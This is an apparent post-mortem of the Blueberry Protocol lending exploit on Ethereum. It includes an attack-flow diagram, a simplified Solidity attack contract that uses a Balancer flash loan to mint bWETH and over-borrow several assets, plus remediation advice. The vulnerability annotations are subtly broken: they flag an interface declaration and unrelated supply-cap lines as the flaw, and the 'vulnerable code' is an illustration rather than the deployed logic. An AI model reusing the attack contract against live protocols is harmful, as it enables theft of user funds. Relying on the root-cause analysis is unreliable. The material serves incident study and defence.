# Blueberry Protocol — Collateral Validation Bypass via Flash Loan Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02-08 |
| **Protocol** | Blueberry Protocol |
| **Chain** | Ethereum |
| **Loss** | ~$1,400,000 |
| **Attacker** | [0xc0ffeeba](https://etherscan.io/address/0xc0ffeebabe5d496b2dde509f9fa189c25cf29671) |
| **Attack Contract** | [0x3aa228a8](https://etherscan.io/address/0x3aa228a80f50763045bdfc45012da124bd0a6809) |
| **Vulnerable Contract** | [Blueberry 0xffadb0bb](https://etherscan.io/address/0xffadb0bba4379dfabfb20ca6823f6ec439429ec2) |
| **Root Cause** | Insufficient collateral value validation logic after minting bWETH collateral, allowing excessive borrowing relative to actual collateral |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/BlueberryProtocol_exp.sol) |

---

## 1. Vulnerability Overview

Blueberry Protocol is a Compound-fork-based lending protocol where users can mint collateral to borrow other assets. The attacker received a flash loan of 1 WETH from Balancer, minted bWETH, exploited a vulnerability in the collateral value calculation to borrow OHM, USDC, and WBTC beyond the collateral value, then swapped via Uniswap V3 to realize profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: insufficient borrow limit validation against collateral value
function borrow(address cToken, uint256 borrowAmount) external {
    // Price manipulation or validation omission during collateral factor calculation
    (uint256 error, uint256 liquidity, uint256 shortfall) = comptroller.getAccountLiquidity(msg.sender);
    require(shortfall == 0, "insufficient collateral");
    // Actual collateral value validation is insufficient — allows excessive borrowing with undercollateralization
    CErc20Interface(cToken).borrow(borrowAmount);
}

// ✅ Safe code: strict collateral ratio validation
function borrow(address cToken, uint256 borrowAmount) external {
    (, uint256 liquidity,) = comptroller.getAccountLiquidity(msg.sender);
    uint256 borrowValue = oracle.getUnderlyingPrice(cToken) * borrowAmount / 1e18;
    require(borrowValue <= liquidity * MAX_BORROW_RATIO / 100, "exceeds collateral");
    CErc20Interface(cToken).borrow(borrowAmount);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Comptroller.sol
    function mintAllowed(
        address bToken,
        address minter,
        uint256 mintAmount
    ) external returns (uint256) {
        // Pausing is a very serious situation - we revert to sound the alarms
        require(!mintGuardianPaused[bToken], "mint is paused");
        require(!isCreditAccount(minter, bToken), "credit account cannot mint");

        require(isMarketListed(bToken), "market not listed");

        uint256 supplyCap = supplyCaps[bToken];
        // Supply cap of 0 corresponds to unlimited supplying
        if (supplyCap != 0) {
            uint256 totalCash = BToken(bToken).getCash();
            uint256 totalBorrows = BToken(bToken).totalBorrows();
            uint256 totalReserves = BToken(bToken).totalReserves();
            // totalSupplies = totalCash + totalBorrows - totalReserves
            (MathError mathErr, uint256 totalSupplies) = addThenSubUInt(
                totalCash,
                totalBorrows,
                totalReserves
            );
            require(mathErr == MathError.NO_ERROR, "totalSupplies failed");

            uint256 nextTotalSupplies = add_(totalSupplies, mintAmount);  // ❌ Vulnerability
            require(nextTotalSupplies < supplyCap, "market supply cap reached");
        }

        return uint256(Error.NO_ERROR);
    }
```

```solidity
// File: BToken.sol
    function mintInternal(uint256 mintAmount, bool isNative)  // ❌ Vulnerability
        internal
        nonReentrant
        returns (uint256, uint256)
    {
        accrueInterest();
        // mintFresh emits the actual Mint event if successful and logs on errors, so we don't need to
        return mintFresh(msg.sender, mintAmount, isNative);
    }
```

```solidity
// File: BTokenInterfaces.sol
contract BWrappedNativeInterface {
    function mintNative() external payable returns (uint256);  // ❌ Vulnerability

    function redeemNative(uint256 redeemTokens) external returns (uint256);

    function redeemUnderlyingNative(uint256 redeemAmount)
        external
        returns (uint256);

    function borrowNative(uint256 borrowAmount) external returns (uint256);

    function repayBorrowNative() external payable returns (uint256);

    function repayBorrowBehalfNative(address borrower)
        external
        payable
        returns (uint256);

    function liquidateBorrowNative(
        address borrower,
        BTokenInterface bTokenCollateral
    ) external payable returns (uint256);

    function flashLoan(
        ERC3156FlashBorrowerInterface receiver,
        address initiator,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);

    function _addReservesNative() external payable returns (uint256);

    function collateralCap() external view returns (uint256);

    function totalCollateralTokens() external view returns (uint256);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Deposit tiny ETH (0.000000000000009997)
  │
  ├─→ [2] ETH → WETH wrap
  │
  ├─→ [3] Balancer flash: 1 WETH flash loan
  │
  ├─→ [4] enterMarkets for bWETH market
  │
  ├─→ [5] Mint 1 WETH → bWETH (set as collateral)
  │
  ├─→ [6] Borrow OHM (exceeds collateral value)
  │   ├─→ Borrow USDC
  │   └─→ Borrow WBTC
  │
  ├─→ [7] OHM → WETH (Uniswap V3)
  │
  ├─→ [8] Repay flash loan (1 WETH)
  │
  └─→ [9] ~$1.4M profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IBlueberry {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
}

contract AttackContract {
    IBlueberry constant bWETH = IBlueberry(0xffadb0bba4379dfabfb20ca6823f6ec439429ec2);

    function receiveFlashLoan(
        IERC20[] memory, uint256[] memory, uint256[] memory, bytes memory
    ) external {
        // [1] Enter bWETH market
        address[] memory markets = new address[](1);
        markets[0] = address(bWETH);
        Comptroller(comptroller).enterMarkets(markets);

        // [2] Mint bWETH with 1 WETH
        WETH.approve(address(bWETH), 1 ether);
        bWETH.mint(1 ether);

        // [3] Borrow OHM, USDC, WBTC with insufficient collateral
        IOHMCToken(bOHM).borrow(ohmAmount);
        IUSDCCToken(bUSDC).borrow(usdcAmount);
        IWBTCCToken(bWBTC).borrow(wbtcAmount);

        // [4] Swap OHM → WETH (Uniswap V3)
        swapOHMToWETH(ohmAmount);

        // [5] Repay flash loan
        WETH.transfer(balancer, 1 ether);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Collateral Validation Bypass |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (via flash loan) |
| **DApp Category** | Compound-fork lending protocol |
| **Impact** | Protocol fund drain via undercollateralized borrowing |

## 6. Remediation Recommendations

1. **Stricter Collateral Ratio**: Enforce strict LTV ratio validation against actual collateral value at borrow time
2. **Oracle Price Validation**: Use TWAP-based secure oracles for collateral value calculation
3. **Block Borrowing Within Flash Loan**: Prevent borrow attempts following flash loan receipt within the same transaction
4. **Maximum Single-Borrow Cap**: Prohibit borrowing beyond a fixed percentage of total protocol liquidity in a single transaction

## 7. Lessons Learned

- Compound forks must incorporate the original's security patches and latest audit findings without exception.
- The ability to borrow millions of dollars with 1 WETH represents a critical flaw in the collateral ratio calculation logic.
- The pattern of using a flash loan as collateral to borrow within the same transaction must be explicitly blocked at the protocol design level.